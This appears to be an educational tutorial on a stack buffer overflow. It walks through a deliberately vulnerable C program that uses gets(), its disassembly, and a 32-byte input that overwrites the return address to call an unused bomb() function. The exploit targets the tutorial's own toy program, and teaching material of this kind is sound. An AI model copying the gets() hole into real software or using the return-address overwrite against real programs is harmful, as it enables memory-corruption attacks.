# Stack Overflow Level 2

> In this level, we will continue from level 1. The main goal is to forge the return address, making function to jump to somewhere we intended. 

## Goals
* Hunt down the structure of program
* Compose a proper string and do testing work

## Hunt
There is a funcion `bomb()` in `example2.c`, which seems not called by any function. By modifying the return address in the stack, we want to trigger the bomb. Interesting?

This requires us to inverstigate into where the return address is pushed at. Let's first experiment with it.

    //example2.c
    #include <stdio.h>
    #define BUF_SIZE 8

    void bomb(){
      printf("BANG!!!!!\n");
    }

    void readBuf(){
      char buf[BUF_SIZE];
      gets(buf);
    }

    int main(){
      readBuf();
      printf("exit normally :(\n");
      return 0;
    }


So, let's exploit the disassembled code:

    000000000040057d <bomb>:
      40057d:       55                      push   %rbp
      40057e:       48 89 e5                mov    %rsp,%rbp
      400581:       bf 54 06 40 00          mov    $0x400654,%edi
      400586:       e8 c5 fe ff ff          callq  400450 <puts@plt>
      40058b:       5d                      pop    %rbp
      40058c:       c3                      retq   

    000000000040058d <readBuf>:
      40058d:       55                      push   %rbp
      40058e:       48 89 e5                mov    %rsp,%rbp
      400591:       48 83 ec 10             sub    $0x10,%rsp
      400595:       48 8d 45 f0             lea    -0x10(%rbp),%rax
      400599:       48 89 c7                mov    %rax,%rdi
      40059c:       e8 df fe ff ff          callq  400480 <gets@plt>
      4005a1:       c9                      leaveq 
      4005a2:       c3                      retq   


Here, we know two things: First, we needs to feed in a string _a little longer_ than `0x10` bytes. And, the address of bomb is `0x0000 0000 0040 057d`

## Hack
Let's do experiment first, we'll use a 14 byte long string, which is composed entirely of `FF`: 

    FF FF FF FF
    FF FF FF FF
    FF FF FF FF
    FF FF

the output is: `exit normally :(`, sadly normal.

So, let make it 20 bytes long. Still normally.

Now, 24 bytes. The output is silent.

Finally, 28 bytes. `Segmentation fault (core dumped)`

So, I want to make a good explanation here.

16 bytes should be reserved for data. Then the pushed `%rbp`, which should be 8 bytes. Then, the return address, 8 more bytes. If on 32-bit width string, we just needs 4 bytes each.

So, in order to hack into the return address. we need 16 + 8 + 8 = 32 bytes. The ending 8 bytes would be our forged return address.

    FF FF FF FF
    FF FF FF FF
    FF FF FF FF
    FF FF FF FF

    FF FF FF FF
    FF FF FF FF

    7D 05 40 00
    00 00 00 00


And `BANG!!!`, mind the little endian problem as well, dear reader.